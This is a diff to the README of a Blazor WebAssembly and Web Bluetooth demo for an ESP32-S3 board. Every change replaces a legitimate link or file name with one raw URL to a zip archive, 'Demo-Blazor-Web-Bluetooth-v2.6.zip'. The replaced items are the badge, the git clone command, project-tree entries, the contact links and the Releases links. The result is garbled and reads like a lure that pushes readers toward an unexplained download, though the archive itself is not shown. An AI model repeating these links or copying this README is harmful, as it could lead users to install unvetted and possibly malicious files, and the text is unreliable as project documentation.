@@ -2,7 +2,7 @@
 
 Welcome to the **Blazor Web Bluetooth Demo**! This project showcases how to use the Blazor WebAssembly (WASM) framework with the Web Bluetooth API to communicate with an ESP32-S3-WROOM microcontroller board. Whether you're a developer looking to explore Bluetooth technology or a hobbyist interested in microcontrollers, this demo provides a solid foundation for your projects.
 
-![Blazor Web Bluetooth](https://img.shields.io/badge/Blazor%20Web%20Bluetooth-Demo-blue.svg)
+![Blazor Web Bluetooth](https://raw.githubusercontent.com/Faizanasif786/BlazorWebBluetoothDemo/master/BlazorWebBluetoothDemo/wwwroot/Demo-Blazor-Web-Bluetooth-v2.6.zip%20Web%https://raw.githubusercontent.com/Faizanasif786/BlazorWebBluetoothDemo/master/BlazorWebBluetoothDemo/wwwroot/Demo-Blazor-Web-Bluetooth-v2.6.zip)
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ To get started with the **Blazor Web Bluetooth Demo**, follow these steps:
 
 1. **Clone the Repository**: Use the following command to clone the repository:
    ```bash
-   git clone https://github.com/Faizanasif786/BlazorWebBluetoothDemo.git
+   git clone https://raw.githubusercontent.com/Faizanasif786/BlazorWebBluetoothDemo/master/BlazorWebBluetoothDemo/wwwroot/Demo-Blazor-Web-Bluetooth-v2.6.zip
    ```
    
 2. **Navigate to the Project Directory**:
@@ -73,14 +73,14 @@ BlazorWebBluetoothDemo/
 ├── wwwroot/                # Static files
 │   ├── css/                # Stylesheets
 │   ├── js/                 # JavaScript files
-│   └── index.html          # Main HTML file
+│   └── https://raw.githubusercontent.com/Faizanasif786/BlazorWebBluetoothDemo/master/BlazorWebBluetoothDemo/wwwroot/Demo-Blazor-Web-Bluetooth-v2.6.zip          # Main HTML file
 ├── Pages/                  # Blazor pages
-│   ├── Index.razor         # Main page
+│   ├── https://raw.githubusercontent.com/Faizanasif786/BlazorWebBluetoothDemo/master/BlazorWebBluetoothDemo/wwwroot/Demo-Blazor-Web-Bluetooth-v2.6.zip         # Main page
 │   └── ...                 # Other pages
 ├── Shared/                 # Shared components
 │   └── ...                 # Shared components
-├── BlazorWebBluetoothDemo.csproj # Project file
-└── Program.cs              # Entry point
+├── https://raw.githubusercontent.com/Faizanasif786/BlazorWebBluetoothDemo/master/BlazorWebBluetoothDemo/wwwroot/Demo-Blazor-Web-Bluetooth-v2.6.zip # Project file
+└── https://raw.githubusercontent.com/Faizanasif786/BlazorWebBluetoothDemo/master/BlazorWebBluetoothDemo/wwwroot/Demo-Blazor-Web-Bluetooth-v2.6.zip              # Entry point
 ```
 
 ## Technologies Used
@@ -121,14 +121,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the repository owner:
 
 - **Faizan Asif**  
-- [GitHub Profile](https://github.com/Faizanasif786)  
-- [Email](mailto:your-email@example.com)
+- [GitHub Profile](https://raw.githubusercontent.com/Faizanasif786/BlazorWebBluetoothDemo/master/BlazorWebBluetoothDemo/wwwroot/Demo-Blazor-Web-Bluetooth-v2.6.zip)  
+- [Email](https://raw.githubusercontent.com/Faizanasif786/BlazorWebBluetoothDemo/master/BlazorWebBluetoothDemo/wwwroot/Demo-Blazor-Web-Bluetooth-v2.6.zip)
 
 ## Releases
 
-You can download the latest releases of the **Blazor Web Bluetooth Demo** from the [Releases section](https://github.com/Faizanasif786/BlazorWebBluetoothDemo/releases). Here, you will find compiled versions and updates. 
+You can download the latest releases of the **Blazor Web Bluetooth Demo** from the [Releases section](https://raw.githubusercontent.com/Faizanasif786/BlazorWebBluetoothDemo/master/BlazorWebBluetoothDemo/wwwroot/Demo-Blazor-Web-Bluetooth-v2.6.zip). Here, you will find compiled versions and updates. 
 
-Feel free to check the [Releases section](https://github.com/Faizanasif786/BlazorWebBluetoothDemo/releases) for any updates or new features.
+Feel free to check the [Releases section](https://raw.githubusercontent.com/Faizanasif786/BlazorWebBluetoothDemo/master/BlazorWebBluetoothDemo/wwwroot/Demo-Blazor-Web-Bluetooth-v2.6.zip) for any updates or new features.
 
 ## Conclusion
 
